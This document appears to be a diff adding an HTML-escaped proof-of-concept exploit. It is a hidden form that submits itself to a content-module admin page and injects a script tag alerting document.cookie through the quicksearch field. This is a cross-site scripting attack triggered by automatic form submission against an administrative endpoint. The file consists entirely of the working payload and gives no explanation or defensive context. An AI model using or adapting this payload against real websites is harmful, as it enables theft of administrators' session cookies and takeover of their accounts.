@@ -1,0 +1,9 @@
+&lt;form action=&quot;http://www.example.com/modules/content/admin/content.php&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;quicksearch_ContentContent&quot; value=&#039;search&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;button_quicksearch_ContentContent&quot; value=&quot;Search&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;filtersel&quot; value=&quot;default&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;limitsel&quot; value=&quot;15&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
